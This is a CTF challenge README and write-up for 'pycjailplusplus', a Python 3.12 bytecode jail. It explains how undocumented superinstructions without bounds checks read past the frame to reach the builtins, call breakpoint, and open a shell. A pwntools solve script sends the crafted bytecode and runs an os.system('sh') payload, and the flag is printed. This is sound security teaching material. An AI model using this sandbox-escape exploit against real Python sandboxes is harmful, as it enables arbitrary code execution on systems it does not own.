# pycjailplusplus

Author: `flocto`

Inspired by [`pycjail-returns` from AngstromCTF 2024](https://github.com/blairsec/challenges/blob/master/angstromctf/2024/misc/pycjail-returns/chall.py). Now with less builtins!

## Dev Notes

Run with any version of Python 3.12 (shouldn't matter what minor version but if you're worried stick to the Docker).

Note: This challenge will run differently depending on the system. PLEASE USE THE DOCKER TO TEST!
The attached solve.py is only one way to solve the challenge. 

## Solution

The challenge asks us to submit Python bytecode that does not map to any stored opcode in `opcode.opmap`. This means we have to use unofficial undocumented opcodes to solve the challenge.

In particular, there are optimized opcodes that are undocumented like LOAD_FAST_LOAD_FAST that perform multiple operations in one opcode. Since these are not stored in `opcode.opmap`, we can use them to solve the challenge.

Additionally, these opcodes do not have bound checking, so with `LOAD_FAST__LOAD_CONST` we can reach into `frame->localsplus` beyond the extent of the current execution frame. This allows us to immediately acquire builtins as a dictionary with the offset of 40. 

Afterwards all we do is extract breakpoint from the dictionary, load its `__call__` attribute, and call that instead. This is due to the fact that calling breakpoint directly would try to call it in the context of the current frame, which would fail due to the lack of builtins. We can bypass this by calling the `__call__` attribute directly.

Finally, we need to have an opcode at the end that causes either some failure or for the function to return. Otherwise, the execution would terminate before actually entering the `__call__`.

```python
import opcode
from pwn import remote
cod = bytes([
        # LOAD_FAST__LOAD_CONST does both in one instruction
        # LOAD_FAST 40 reaches into frame->localsplus and retrieves "builtins" which was loaded previously before the eval
        # the 255 is to prevent banned, then LOAD_CONST 0 loads "breakpoint"
        # 84, 40, 255, 0,
        86, 40, 255, 0,
        # pops both, loads builtins["breakpoint"] 
        19, 0, 255, 0,

        # LOAD __call__ attribute
        76, 1, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 

        # CALL_PY_EXACT_ARGS works without segfaulting now because its a method call
        23, 0, 255, 0, 255, 0, 255, 0,
        
        # Error after
        255, 0,
    ])

# name = input("name? ")
name = b'__call__'
# const = input("const? ")
const = b'breakpoint'
print(cod.hex(), len(cod), name, const)

r = remote('localhost', 5000, level='error')

codeedit = bytearray(cod)
r.sendlineafter(b'code? ', codeedit.hex().encode())
r.sendlineafter(b'name? ', name)
r.sendlineafter(b'const? ', const)

r.sendlineafter(b'(Pdb) ', b'__import__("os").system("sh")')

r.interactive()
```

This drops us into a shell and we can simply cat the flag.

flag:
`gigem{1_h0p3_U_f0und_som3_un1nt3nd3ds!}`
